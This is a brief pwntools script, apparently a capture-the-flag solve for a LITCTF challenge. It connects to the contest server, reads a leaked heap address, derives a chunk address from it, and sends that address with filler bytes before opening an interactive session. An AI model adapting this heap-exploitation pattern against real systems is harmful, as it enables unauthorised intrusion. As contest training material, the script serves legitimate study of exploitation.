from pwn import *
elf = context.binary = ELF("./s")
r = elf.process()
r = remote("litctf.org", 31772)
# gdb.attach(r, '''
#     b*main+188\n
#     c
# ''')
heap_leak = int(r.recvline(),16)
chunk_c = heap_leak - 0x48
log.success(f"HEAP leak: {hex(heap_leak)} \nCHUNK2: {hex(chunk_c)}")

r.sendline(str(chunk_c))
r.sendline(b"AAAAAAAA")

r.interactive()